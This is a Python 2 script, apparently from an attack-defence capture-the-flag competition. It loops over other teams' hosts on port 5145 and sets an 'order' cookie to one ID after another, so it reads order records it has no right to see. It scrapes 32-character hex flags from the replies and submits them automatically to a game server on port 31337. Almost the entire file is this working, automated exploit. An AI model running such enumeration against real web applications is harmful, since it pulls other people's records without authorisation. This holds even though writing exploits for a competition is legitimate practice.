#! /usr/bin/env python
import socket
import os, sys 
import urllib, urllib2
import re
import time

def submit(*args,**kwargs):
        TEAMIP = '10.0.17.3'
        GAMESERVER = '10.0.3.3'
        PORT = 31337
        for flag in args:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((GAMESERVER, PORT))
                msg = s.recv(1024)
                print msg
                s.send('7\n')
                #s.send(TEAMIP+'\n')
                msg = s.recv(1024)
                print msg
                s.send(flag+'\n')
                print s.recv(1024)

def http_request( url, values, method, cookies=None):
        #url = 'http://ww.something.de'
        #values = {'id':'value'}
        #method = 'GET' or 'POST'
        data = urllib.urlencode( values )
        if method == 'GET':
                url = url + '?' + data
                req = urllib2.Request( url )
        if method == 'POST':
                req = urllib2.Request( url, data )
        if cookies:
            string = ''
            for name, val in cookies.items():
                string += '{}={}; '.format(name,val)
            req.add_header('Cookie', string)
        response = urllib2.urlopen( req, timeout=2 )
        return response.read()

# Port zum submitte

# Hosts to exploit
HOSTS = [ '10.0.{}.3'.format(i) for i in range(11, 23) if i != 17 ]

class Exploiter(object):
    def run(self, host, start):
        print 'Trying host', host
        for order in range(start, start+100):
            print order
            try:
                reply=http_request('http://{}:5145/'.format(host),{'action':'order','method':'view'},'GET', {'order':order})
                match=re.findall(r'[a-f0-9]{32}', reply)
                for m in match:
                    print host, m
                    start = order
                    submit(m)
                    time.sleep(1)
            except KeyboardInterrupt:
                exit(1)
            except:
                continue
        return start

e = Exploiter()
start = 1
while True:
    start = e.run(sys.argv[1], start)
    print 'yay, pause'
    time.sleep(60)
